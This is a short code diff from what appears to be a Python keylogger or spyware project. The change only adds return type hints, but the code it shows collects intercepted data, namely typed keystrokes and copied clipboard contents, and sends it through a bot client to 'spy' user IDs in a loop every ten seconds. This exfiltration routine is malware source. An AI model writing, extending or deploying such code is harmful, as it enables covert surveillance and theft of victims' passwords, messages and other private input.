@@ -56,7 +56,7 @@ def send_data_to_spy(bot_instance, user_id: int, intercepted: dict) -> None:
                     bot_instance.client.send_message(user_id, chunk)
 
 
-def send_data_to_spies(bot_instance):
+def send_data_to_spies(bot_instance) -> None:
     intercepted_data = {
         'typed': get_types(),
         'copied': get_copies()
@@ -68,7 +68,7 @@ def send_data_to_spies(bot_instance):
         send_data_to_spy(bot_instance, user_id, intercepted_data)
 
 
-def data_sender_loop(bot_instance):
+def data_sender_loop(bot_instance) -> None:
     while True:
         send_data_to_spies(bot_instance)
         sleep(10)
